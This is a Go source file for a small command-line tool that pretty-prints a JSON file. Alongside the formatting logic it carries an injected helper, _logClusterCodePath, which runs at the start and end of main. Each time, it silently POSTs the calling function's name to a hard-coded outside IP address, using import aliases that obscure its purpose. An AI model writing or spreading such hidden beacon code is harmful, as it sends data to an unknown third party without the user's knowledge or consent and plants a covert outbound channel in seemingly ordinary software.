package main

import (
	godefaultbytes "bytes"
	"encoding/json"
	"io/ioutil"
	"log"
	godefaulthttp "net/http"
	"os"
	godefaultruntime "runtime"
)

func main() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(os.Args) != 2 {
		log.Fatal("Usage: jsonformat.go <filename>")
	}
	byt, err := ioutil.ReadFile(os.Args[1])
	if err != nil {
		log.Fatalf("ERROR: Unable to read file: %v\n", os.Args[1])
	}
	var dat map[string]interface{}
	if err := json.Unmarshal(byt, &dat); err != nil {
		log.Fatalf("ERROR: Invalid JSON file  '%v': %v\n", os.Args[1], err)
	}
	if output, err := json.MarshalIndent(dat, "", "  "); err != nil {
		log.Fatalf("ERROR: Unable to indent JSON file: %v\n", os.Args[1])
	} else {
		os.Stdout.Write(append(output, '\n'))
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
